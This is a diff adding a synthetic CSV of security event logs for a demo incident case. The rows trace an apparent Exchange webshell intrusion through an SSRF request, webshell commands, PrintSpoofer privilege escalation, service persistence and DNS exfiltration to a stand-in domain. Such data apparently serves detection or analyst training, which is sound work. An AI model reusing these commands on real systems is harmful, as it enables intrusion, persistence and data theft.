@@ -1,0 +1,9 @@
+﻿event_id,batch_id,incident_id,case_id,timestamp,source,log_id,content
+EVT-SIM008-001,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:00:03+08:00,waf,SYNWAF0511001,host=app-web-32.ops-corp.com POST /ecp/a91c2/ecp.aspx X-BEResource=localhost~1942062522 502
+EVT-SIM008-002,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:00:05+08:00,web,SYNWEB0511002,host=app-web-32.ops-corp.com POST /ecp/a91c2/ecp.aspx X-BEResource=localhost~1942062522 502 upstream_timeout
+EVT-SIM008-003,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:00:39+08:00,hids,SYNHID0511003,host=app-web-32.ops-corp.com 进程创建: w3wp.exe (IIS APPPOOL\DefaultAppPool) 派生子进程 cmd.exe /c whoami & ipconfig /all
+EVT-SIM008-004,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:01:14+08:00,rasp,SYNRASP0511004,"host=app-web-32.ops-corp.com POST /aspnet_client/system_web/health.aspx {""cmd"":""whoami""} 200"
+EVT-SIM008-005,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:01:30+08:00,web,SYNWEB0511005,host=app-web-32.ops-corp.com GET /aspnet_client/system_web/health.aspx?cmd=ipconfig 200
+EVT-SIM008-006,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:08:11+08:00,hids,SYNHID0511006,"host=app-web-32.ops-corp.com C:\ProgramData\PrintSpoofer.exe -i -c ""cmd /c whoami"" 提权成功 (SeImpersonatePrivilege)"
+EVT-SIM008-007,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:10:02+08:00,hids,SYNHID0511007,"host=app-web-32.ops-corp.com sc.exe create CacheSync binPath= ""C:\ProgramData\cache.exe"" start= auto"
+EVT-SIM008-008,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:19:47+08:00,dns,SYNDNS0511008,host=app-web-32.ops-corp.com c2VjcmV0LWRhdGEtMDI.exfil-cdn.com TXT 203.0.113.67
